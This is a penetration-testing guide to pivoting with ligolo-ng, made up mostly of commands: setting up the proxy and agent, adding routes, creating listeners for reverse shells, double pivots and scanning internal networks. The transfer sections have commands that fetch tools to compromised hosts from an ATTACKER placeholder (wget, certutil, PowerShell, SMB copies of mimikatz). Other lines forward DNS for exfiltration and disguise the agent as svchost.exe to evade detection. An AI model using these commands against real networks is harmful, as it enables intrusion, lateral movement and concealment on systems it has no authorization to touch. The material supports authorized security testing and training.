# ligolo-ng Techniques and Pivoting Guide

This guide covers practical network pivoting techniques using ligolo-ng for penetration testing engagements.

## Table of Contents

- [Complete Setup Guide](#complete-setup-guide)
  - [Proxy Setup (Attack Machine)](#proxy-setup-attack-machine)
  - [Agent Deployment](#agent-deployment)
  - [TUN Interface Configuration](#tun-interface-configuration)
- [Route Management](#route-management)
- [Session Management](#session-management)
- [Listeners for Reverse Connections](#listeners-for-reverse-connections)
- [File Transfer Through Tunnel](#file-transfer-through-tunnel)
- [Practical Scenarios](#practical-scenarios)
  - [Single Pivot](#single-pivot)
  - [Double Pivot (Chained)](#double-pivot-chained)
  - [Accessing Multiple Networks](#accessing-multiple-networks)
  - [Using nmap Through Tunnel](#using-nmap-through-tunnel)
- [Comparison with Alternatives](#comparison-with-alternatives)
- [Troubleshooting](#troubleshooting)
- [Tips and Best Practices](#tips-and-best-practices)

---

## Complete Setup Guide

### Proxy Setup (Attack Machine)

The proxy runs on your attack machine and requires root privileges to create TUN interfaces.

#### Step 1: Create TUN Interface

```bash
# Linux - Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Verify interface exists
ip addr show ligolo
```

For Windows:
```powershell
# Download wintun.dll from https://www.wintun.net/
# Place in same directory as proxy or system32
# Ligolo-ng will create the interface automatically
```

For macOS:
```bash
# macOS uses utun interfaces, created automatically by proxy
# No manual configuration needed
```

#### Step 2: Start the Proxy

```bash
# Basic start with self-signed certificate
./proxy -selfcert -laddr 0.0.0.0:11601

# With custom certificate
./proxy -certfile cert.pem -keyfile key.pem -laddr 0.0.0.0:11601

# With Let's Encrypt (requires domain and port 80 access)
./proxy -autocert -laddr 0.0.0.0:443

# Enable web UI (v0.8+)
./proxy -selfcert -laddr 0.0.0.0:11601 -webui

# Daemon mode
./proxy -selfcert -laddr 0.0.0.0:11601 -daemon
```

#### Proxy Command-Line Options

| Option | Description |
|--------|-------------|
| `-laddr` | Listening address (default: 0.0.0.0:11601) |
| `-selfcert` | Generate self-signed certificate |
| `-certfile` | Path to TLS certificate file |
| `-keyfile` | Path to TLS private key file |
| `-autocert` | Use Let's Encrypt for automatic certificates |
| `-webui` | Enable web interface |
| `-daemon` | Run as background daemon |
| `-config` | Path to configuration file |

### Agent Deployment

The agent runs on compromised hosts and requires no privileges.

#### Transfer Agent to Target

```bash
# Python HTTP server on attacker
python3 -m http.server 8000

# Download on target (Linux)
wget http://ATTACKER:8000/agent
curl -O http://ATTACKER:8000/agent
chmod +x agent

# Download on target (Windows)
certutil -urlcache -f http://ATTACKER:8000/agent.exe agent.exe
powershell -c "IWR -Uri http://ATTACKER:8000/agent.exe -OutFile agent.exe"
```

#### Connect Agent to Proxy

```bash
# Standard connection
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Retry on failure (persistent)
./agent -connect ATTACKER_IP:11601 -ignore-cert -retry

# Bind mode (agent listens, proxy connects)
./agent -bind 0.0.0.0:11601 -ignore-cert

# WebSocket connection (bypass firewalls)
./agent -connect wss://ATTACKER_IP:11601 -ignore-cert
```

#### Agent Command-Line Options

| Option | Description |
|--------|-------------|
| `-connect` | Proxy address to connect to |
| `-bind` | Address to bind and wait for connection |
| `-ignore-cert` | Ignore TLS certificate validation |
| `-retry` | Auto-retry on connection failure |
| `-socks` | Enable SOCKS5 server on agent |
| `-socks-addr` | SOCKS5 listen address |

### TUN Interface Configuration

#### Manual Interface Setup (Linux)

```bash
# Create named interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Create additional interfaces for multiple tunnels
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Delete interface when done
sudo ip tuntap del mode tun ligolo
```

#### Automatic Interface Management (v0.8+)

```bash
# Proxy auto-creates interfaces when using autoroute
# In proxy console:
[Agent: user@target] >> autoroute
```

---

## Route Management

Routes determine which traffic goes through the tunnel to the remote network.

### Adding Routes

```bash
# Add route to target network (run on attack machine)
sudo ip route add 10.10.0.0/24 dev ligolo
sudo ip route add 192.168.1.0/24 dev ligolo

# Add route to specific host
sudo ip route add 10.10.0.100/32 dev ligolo

# Add multiple networks
sudo ip route add 172.16.0.0/16 dev ligolo
```

### In-Proxy Route Management (v0.8+)

```
# Select session first
ligolo-ng >> session
? Specify a session: 1 - user@target - 10.10.0.50:54321

# View available networks on agent
[Agent: user@target] >> ifconfig

# Automatic route configuration
[Agent: user@target] >> autoroute

# Manual route from proxy console
[Agent: user@target] >> route add 10.10.0.0/24
[Agent: user@target] >> route del 10.10.0.0/24
[Agent: user@target] >> route show
```

### Viewing Current Routes

```bash
# Show routes through ligolo interface
ip route show dev ligolo

# All routes
ip route

# Verify route is working
traceroute 10.10.0.100
```

### Removing Routes

```bash
# Remove specific route
sudo ip route del 10.10.0.0/24 dev ligolo

# Remove all routes through interface
sudo ip route flush dev ligolo
```

---

## Session Management

### Listing Sessions

```
ligolo-ng >> session
? Specify a session:
  1 - root@pivot1 - 192.168.1.50:54321
  2 - admin@pivot2 - 10.10.0.25:54322
```

### Selecting and Starting Tunnel

```
# Select session
ligolo-ng >> session
? Specify a session: 1

# View session info
[Agent: root@pivot1] >> ifconfig

# Start the tunnel
[Agent: root@pivot1] >> start

# Start on specific interface (multiple tunnels)
[Agent: root@pivot1] >> start --tun ligolo2
```

### Session Commands

| Command | Description |
|---------|-------------|
| `session` | List and select sessions |
| `ifconfig` | Show agent network interfaces |
| `start` | Start tunnel for selected session |
| `stop` | Stop active tunnel |
| `autoroute` | Automatically add routes for agent networks |
| `route add/del/show` | Manage routes |
| `listener_add` | Add listener on agent |
| `listener_list` | List active listeners |
| `listener_stop` | Stop a listener |
| `kill` | Terminate the agent |

---

## Listeners for Reverse Connections

Listeners allow services on your attack machine to be accessible from the remote network. Essential for catching reverse shells through the tunnel.

### Creating Listeners

```
# In proxy console, select session first
[Agent: user@target] >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Listen on agent port 4444, forward to attacker's port 4444
# Reverse shells from internal network can now reach your machine
```

### Listener Syntax

```
listener_add --addr <agent_listen_addr>:<port> --to <attacker_addr>:<port> --tcp|--udp
```

### Common Listener Scenarios

```
# Catch reverse shell from internal network
[Agent: user@target] >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# On attacker, start listener
nc -lvnp 4444

# Trigger reverse shell on internal host pointing to agent IP:4444
# 10.10.0.X --> Agent:4444 --> Attacker:4444
```

```
# Forward DNS for exfiltration
[Agent: user@target] >> listener_add --addr 0.0.0.0:53 --to 127.0.0.1:53 --udp

# Forward HTTP for payload delivery
[Agent: user@target] >> listener_add --addr 0.0.0.0:80 --to 127.0.0.1:8080 --tcp
```

### Managing Listeners

```
# List all active listeners
[Agent: user@target] >> listener_list

# Stop a specific listener
[Agent: user@target] >> listener_stop <listener_id>
```

---

## File Transfer Through Tunnel

With ligolo-ng, you can transfer files directly using standard tools since you have full network access.

### HTTP-Based Transfer

```bash
# Start HTTP server on attacker
python3 -m http.server 8000

# Download on internal target (through tunnel)
# From 10.10.0.X reaching attacker via tunnel
wget http://ATTACKER_TUN_IP:8000/linpeas.sh
curl http://ATTACKER_TUN_IP:8000/tools.tar.gz -o tools.tar.gz
```

### SMB-Based Transfer (Windows)

```bash
# Start SMB server on attacker
impacket-smbserver share /tmp/share -smb2support

# Access from internal Windows target
copy \\ATTACKER_TUN_IP\share\mimikatz.exe C:\temp\
```

### Using Listeners for File Transfer

```
# Create listener for file server
[Agent: user@target] >> listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp

# Internal hosts can now download from agent_ip:8000
# Start web server on attacker port 8000
python3 -m http.server 8000

# Internal target downloads via agent
wget http://AGENT_IP:8000/file.sh
```

### SCP/SFTP Through Tunnel

```bash
# Direct SCP to internal host (if SSH available)
scp -i key.pem file.txt user@10.10.0.100:/tmp/

# SFTP session
sftp user@10.10.0.100
```

---

## Practical Scenarios

### Single Pivot

Access an internal network through a single compromised host.

**Network Layout:**
```
Attacker (192.168.1.10) --> DMZ Host (192.168.1.50 / 10.10.0.50) --> Internal (10.10.0.0/24)
```

**Steps:**

1. Set up proxy on attacker:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

2. Run agent on DMZ host:
```bash
./agent -connect 192.168.1.10:11601 -ignore-cert
```

3. In proxy console:
```
ligolo-ng >> session
[Agent: user@dmz] >> start
```

4. Add route to internal network:
```bash
sudo ip route add 10.10.0.0/24 dev ligolo
```

5. Access internal network directly:
```bash
nmap -sT -Pn 10.10.0.0/24
curl http://10.10.0.100/
ssh admin@10.10.0.200
```

### Double Pivot (Chained)

Access a third network segment through two pivot points.

**Network Layout:**
```
Attacker (192.168.1.10)
    |
    v
Pivot1 (192.168.1.50 / 10.10.0.50)
    |
    v
Pivot2 (10.10.0.100 / 172.16.0.100)
    |
    v
Internal2 (172.16.0.0/24)
```

**Steps:**

1. Set up first pivot (same as single pivot):
```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot1
./agent -connect 192.168.1.10:11601 -ignore-cert
```

2. Start first tunnel and add route:
```
[Agent: user@pivot1] >> start
```
```bash
sudo ip route add 10.10.0.0/24 dev ligolo
```

3. Create listener on Pivot1 for second agent:
```
[Agent: user@pivot1] >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

4. Run agent on Pivot2 connecting through Pivot1:
```bash
# On Pivot2
./agent -connect 10.10.0.50:11601 -ignore-cert
```

5. Create second TUN interface:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
```

6. Select Pivot2 session and start on ligolo2:
```
ligolo-ng >> session
? Specify a session: 2 - user@pivot2

[Agent: user@pivot2] >> start --tun ligolo2
```

7. Add route to third network:
```bash
sudo ip route add 172.16.0.0/24 dev ligolo2
```

8. Access all networks:
```bash
# First internal network
nmap -sT -Pn 10.10.0.0/24

# Second internal network
nmap -sT -Pn 172.16.0.0/24
```

### Accessing Multiple Networks

When a single pivot host has access to multiple internal networks.

**Network Layout:**
```
Attacker --> Pivot (has interfaces on 10.10.0.0/24, 10.20.0.0/24, 10.30.0.0/24)
```

**Steps:**

1. Standard setup:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

2. Connect agent and start tunnel:
```
[Agent: user@pivot] >> ifconfig
# Shows: eth0 (10.10.0.50), eth1 (10.20.0.100), eth2 (10.30.0.25)

[Agent: user@pivot] >> start
```

3. Add routes for all networks:
```bash
sudo ip route add 10.10.0.0/24 dev ligolo
sudo ip route add 10.20.0.0/24 dev ligolo
sudo ip route add 10.30.0.0/24 dev ligolo
```

Or use autoroute:
```
[Agent: user@pivot] >> autoroute
```

4. Scan and access all networks:
```bash
nmap -sT -Pn 10.10.0.0/24 10.20.0.0/24 10.30.0.0/24
```

### Using nmap Through Tunnel

Ligolo-ng enables direct nmap scanning without proxychains, but some considerations apply.

#### Basic Scanning

```bash
# TCP Connect scan (recommended)
nmap -sT -Pn 10.10.0.0/24

# With service detection
nmap -sT -Pn -sV 10.10.0.100

# Full port scan
nmap -sT -Pn -p- 10.10.0.100 --min-rate 1000
```

#### Important nmap Flags

| Flag | Purpose |
|------|---------|
| `-sT` | TCP connect scan (required, no raw packets) |
| `-Pn` | Skip host discovery (ICMP may not work reliably) |
| `--unprivileged` | Don't use raw sockets |
| `-PE` | Use ICMP echo for discovery (works with ligolo) |

#### SYN Scan Alternative

Since the agent cannot send raw packets, SYN scans are translated to connect scans:
```bash
# This works but is essentially a connect scan
nmap -sS -Pn 10.10.0.100
# Ligolo translates SYN to connect()
```

#### UDP Scanning

```bash
# UDP scan (slower, may need increased timeout)
nmap -sU -Pn --top-ports 100 10.10.0.100

# Combined TCP/UDP
nmap -sT -sU -Pn -F 10.10.0.100
```

#### Aggressive Scanning Through Tunnel

```bash
# Comprehensive scan
nmap -sT -Pn -A -T4 10.10.0.100

# Script scan
nmap -sT -Pn --script=default,vuln 10.10.0.100

# SMB enumeration
nmap -sT -Pn -p445 --script=smb-enum* 10.10.0.0/24
```

---

## Comparison with Alternatives

### ligolo-ng vs Chisel

| Feature | ligolo-ng | Chisel |
|---------|-----------|--------|
| **Connection Type** | TUN interface (direct IP) | SOCKS proxy / port forward |
| **Requires Proxychains** | No | Yes (for SOCKS) |
| **Protocol Support** | TCP, UDP, ICMP | TCP, UDP |
| **nmap Integration** | Native (any scan type) | Via proxychains only |
| **Multiple Sessions** | Built-in session manager | Separate connections |
| **Resource Usage** | Higher (virtual network stack) | Lower |
| **Setup Complexity** | Requires TUN interface | Single binary, no root |
| **Firewall Evasion** | WebSocket support | HTTP tunneling |
| **Speed** | Faster (100+ Mbps) | Good |

**Use Chisel when:**
- Quick single port forward needed
- Cannot create TUN interfaces (restricted environment)
- Simple SOCKS proxy sufficient
- Lower footprint required

**Use ligolo-ng when:**
- Full network access required
- Running nmap or similar tools
- Multiple internal networks to access
- Long-term pivot engagement
- Need ICMP support

### ligolo-ng vs SSH Tunneling

| Feature | ligolo-ng | SSH |
|---------|-----------|-----|
| **Connection Type** | TUN interface | Port forward / SOCKS |
| **Requires SSH Access** | No | Yes |
| **Agent Required** | Yes | No (if SSH available) |
| **Protocol Support** | TCP, UDP, ICMP | TCP only |
| **Native Tool Support** | Full | Proxychains needed |
| **Setup** | Deploy agent | SSH credentials |
| **Detection** | Custom traffic | Standard SSH |

**Use SSH when:**
- Already have SSH access
- Quick port forward needed
- Blending with normal traffic important

**Use ligolo-ng when:**
- No SSH access available
- Need UDP or ICMP
- Want native tool support
- Multiple network segments

### Quick Selection Guide

```
Need full IP routing? --> ligolo-ng
Simple port forward? --> Chisel or SSH
Have SSH creds only? --> SSH tunneling
Need SOCKS + simple? --> Chisel
Scanning internal net? --> ligolo-ng
UDP required? --> ligolo-ng
Minimal footprint? --> Chisel
```

---

## Troubleshooting

### Common Issues

#### Agent Won't Connect

```bash
# Check proxy is listening
netstat -tlnp | grep 11601

# Verify firewall allows connection
# Test with nc
nc -zv ATTACKER_IP 11601

# Check for certificate issues
./agent -connect ATTACKER_IP:11601 -ignore-cert -v
```

#### Routes Not Working

```bash
# Verify TUN interface is up
ip link show ligolo

# Check route exists
ip route show | grep ligolo

# Verify route is correct
ip route get 10.10.0.100

# Check tunnel is started in proxy console
# Must see "tunnel started" message
```

#### Cannot Reach Internal Hosts

```bash
# Verify agent can reach target
# In proxy console:
[Agent] >> ping 10.10.0.100

# Check agent's interfaces
[Agent] >> ifconfig

# Verify correct network in route
sudo ip route add 10.10.0.0/24 dev ligolo  # Not /16 if network is /24
```

#### nmap Shows All Ports Filtered

```bash
# Use TCP connect scan
nmap -sT -Pn 10.10.0.100

# Disable host discovery
nmap -sT -Pn -n 10.10.0.100

# Check if reaching correct host
# Try known open port
nc -zv 10.10.0.100 22
```

#### Slow Performance

```bash
# Check for network issues
ping -c 10 10.10.0.100

# Reduce nmap rate
nmap -sT -Pn --max-rate 100 10.10.0.0/24

# Check for MTU issues
ping -M do -s 1400 10.10.0.100
```

---

## Tips and Best Practices

### Operational Security

1. **Use legitimate-looking agent names**: Rename agent binary
   ```bash
   mv agent svchost.exe  # Windows
   mv agent /tmp/.cache  # Linux
   ```

2. **Clean up routes after engagement**:
   ```bash
   sudo ip route flush dev ligolo
   sudo ip tuntap del mode tun ligolo
   ```

3. **Kill agents when done**:
   ```
   [Agent: user@target] >> kill
   ```

### Performance Optimization

1. **Limit nmap scan rates for stability**:
   ```bash
   nmap -sT -Pn --min-rate 500 --max-rate 1000 10.10.0.0/24
   ```

2. **Use targeted scans over full range**:
   ```bash
   nmap -sT -Pn -p22,80,443,445,3389 10.10.0.0/24
   ```

3. **For multiple networks, create separate interfaces**:
   ```bash
   sudo ip tuntap add user $(whoami) mode tun ligolo1
   sudo ip tuntap add user $(whoami) mode tun ligolo2
   ```

### Persistence

1. **Use retry flag on agent**:
   ```bash
   ./agent -connect ATTACKER:11601 -ignore-cert -retry
   ```

2. **Consider auto-bind configuration** (v0.8+) for automatic tunnel setup

3. **Document all routes and listeners** for session recovery

### Integration with Other Tools

```bash
# CrackMapExec through tunnel
crackmapexec smb 10.10.0.0/24

# Impacket tools
impacket-psexec admin@10.10.0.100

# Web application testing
gobuster dir -u http://10.10.0.100 -w /usr/share/wordlists/dirb/common.txt

# Evil-WinRM
evil-winrm -i 10.10.0.100 -u admin -p password
```

---

## Quick Reference Commands

### Attack Machine Setup

```bash
# Create interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Add routes (after tunnel started)
sudo ip route add TARGET_NETWORK/CIDR dev ligolo

# Cleanup
sudo ip route flush dev ligolo
sudo ip tuntap del mode tun ligolo
```

### Agent Commands

```bash
# Connect to proxy
./agent -connect PROXY_IP:11601 -ignore-cert

# With auto-retry
./agent -connect PROXY_IP:11601 -ignore-cert -retry

# Bind mode
./agent -bind 0.0.0.0:11601 -ignore-cert
```

### Proxy Console Commands

```
session              # List/select sessions
ifconfig             # Show agent interfaces
start                # Start tunnel
start --tun NAME     # Start on specific interface
stop                 # Stop tunnel
autoroute            # Auto-add routes
route add CIDR       # Add route
route del CIDR       # Remove route
listener_add         # Create listener
listener_list        # Show listeners
listener_stop ID     # Remove listener
kill                 # Terminate agent
```
